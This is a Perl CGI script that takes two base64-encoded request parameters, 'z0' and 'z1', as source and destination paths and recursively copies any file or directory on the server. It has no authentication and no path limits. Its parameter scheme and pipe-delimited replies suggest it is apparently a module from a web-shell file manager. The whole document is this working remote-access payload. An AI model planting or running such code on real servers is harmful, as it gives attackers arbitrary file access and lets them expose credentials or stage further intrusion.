use strict;
use warnings;
use CGI;
use MIME::Base64;
use File::Copy;
use File::Path qw(make_path);
use File::Find;

sub do_copy {
    my ($src, $dest) = @_;

    if (-d $src) {
        if (!-d $dest) {
            eval { make_path($dest, { mode => 0755 }); 1 } or return 0;
        }

        opendir(my $dh, $src) or return 0;
        my @files = readdir($dh);
        closedir($dh);

        foreach my $file (@files) {
            next if $file eq '.' || $file eq '..';

            unless (do_copy("$src/$file", "$dest/$file")) {
                return 0;
            }
        }
        return 1;
    } else {
        my ($dir) = $dest =~ /(.*)[\\\/]/;
        if ($dir && !-d $dir) {
            eval { make_path($dir, { mode => 0755 }); 1 } or return 0;
        }

        return copy($src, $dest) ? 1 : 0;
    }
}

sub main {
    my $q = CGI->new;
    my $src_path = decode_base64($q->param('z0') // '');
    my $dst_path = decode_base64($q->param('z1') // '');

    if (!-e $src_path) {
        print "0|Source does not exist.";
        return;
    }

    if (-e $dst_path) {
        print "0|Destination already exists.";
        return;
    }

    if (do_copy($src_path, $dst_path)) {
        print "1|";
    } else {
        print "0|Error.";
    }
}

main();